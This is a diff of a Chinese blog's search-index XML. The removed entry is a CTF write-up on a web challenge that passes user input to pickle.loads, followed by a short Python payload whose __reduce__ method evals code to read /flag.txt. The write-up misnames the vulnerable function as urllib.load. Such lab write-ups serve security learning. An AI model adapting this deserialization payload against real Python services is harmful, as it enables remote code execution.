class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ui segment&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/b1g_m4mber&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;_xsrf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2|7d6064a8|aa2f7fa393b7c15560a61f46b348f1d0|1596793343&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">hidden</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">class</span>=<span class="string">&quot;f-m ui segment&quot;</span> <span class="attr">name</span>=<span class="string">&quot;become&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;&quot;</span> <span class="attr">value</span>=<span class="string">&quot;admin&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;group&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ui secondary button &quot;</span>&gt;</span>一键成为大会员<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>​        绝了，这题做着做着，还有剧情了。<br>​        在网页上检查元素，删掉第14行中的hidden=”hidden”，显示出输入栏<br>​        第3行中有一个压缩文件，下载解压后得到了网站的源码。其中有admin.py</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminHandler</span>(<span class="params">BaseHandler</span>):</span></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;no_ass.html&#x27;</span>)</span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">&#x27;become&#x27;</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>​        到这里我不会了，打开admin.py，把里面不认识的函数+漏洞作为关键词挨个搜索了之后，urllib.load()这个函数存在一个反序列化漏洞。按照blog里的仿写一个payload。<a href=https://www.cnblogs.com/cimuhuashuimu/p/11544463.html>反序列化漏洞</a></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 只能使用python2，python3因为不明原因无法正常生成payload</span></span><br><span class="line"><span class="keyword">import</span> pickle <span class="keyword">as</span> p</span><br><span class="line"><span class="keyword">import</span> urllib <span class="keyword">as</span> u</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">       <span class="keyword">return</span> (eval, (<span class="string">&#x27;open(&quot;/flag.txt&quot;,&quot;r&quot;).read()&#x27;</span>,))</span><br><span class="line">a = p.dumps(payload())</span><br><span class="line">a = u.quote(a)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure>
-
-<p>​        将输出的payload填进输入栏后即得到flag</p>
-<p><img src="https://i.loli.net/2020/09/29/d14Rh3wYqOgWezu.png" alt="image-20200807193720295.png"></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>WriteUp</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>攻防世界</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>xxd - make a hex dump or do the  reverse</title>
     <url>/2020/09/28/%E6%96%87%E4%BB%B6%E5%8F%8D%E8%BD%AC/</url>
     <content><![CDATA[<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xxd -h</span><br><span class="line">xxd [options][infile[outfile]]</span><br><span class="line">xxd -r [options][infile[outfile]]</span><br></pre></td></tr></table></figure>
@@ -644,7 +644,11 @@
 <li>Baby Andriod</li>
 </ol>
 <h2 id="Sign-in（略）-2-2"><a href="#Sign-in（略）-2-2" class="headerlink" title="Sign in（略）(2/2)"></a>Sign in（略）(2/2)</h2><h2 id="DevOps-0-1"><a href="#DevOps-0-1" class="headerlink" title="DevOps (0/1)"></a>DevOps (0/1)</h2><h2 id="IoT-0-1"><a href="#IoT-0-1" class="headerlink" title="IoT (0/1)"></a>IoT (0/1)</h2><hr>
-<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="02-Welcome-To-Re"><a href="#02-Welcome-To-Re" class="headerlink" title="02 Welcome To Re"></a>02 Welcome To Re</h2><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>拖进IDA</p>
+<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><blockquote>
+<p>感谢bb师傅在Re方面对我的指导。</p>
+<p>==bb，yyds.==</p>
+</blockquote>
+<h2 id="02-Welcome-To-Re"><a href="#02-Welcome-To-Re" class="headerlink" title="02 Welcome To Re"></a>02 Welcome To Re</h2><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>拖进IDA</p>
 <p><img src="https://i.loli.net/2020/10/12/DmstAU1zduR2HL9.png" alt="02-01.png"></p>
 <hr>
 <h2 id="03-Thank-you-JavaScript"><a href="#03-Thank-you-JavaScript" class="headerlink" title="03 Thank you JavaScript"></a>03 Thank you JavaScript</h2><p><img src="https://i.loli.net/2020/07/25/rLTZdOaItNPgJnb.jpg" alt="shashasha.jpg"></p>
@@ -932,8 +936,7 @@
 <p>ooukot{ig3_oqf1_Ymiedmms_BzVn3_s0w_w0_3csO}</p>
 <p>大括号前明文是moectf，盲猜Ymiedmms是Virginia，w0是s0，3csO是3asY。</p>
 <p>然后<strong>手撕</strong>。</p>
-<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><p>##　01 GET</p>
-<p>get提交a=flag</p>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="01-GET"><a href="#01-GET" class="headerlink" title="01 GET"></a>01 GET</h2><p>get提交a=flag</p>
 <hr>
 <h2 id="02-POST"><a href="#02-POST" class="headerlink" title="02 POST"></a>02 POST</h2><p>POST提交a=flag</p>
 <hr>
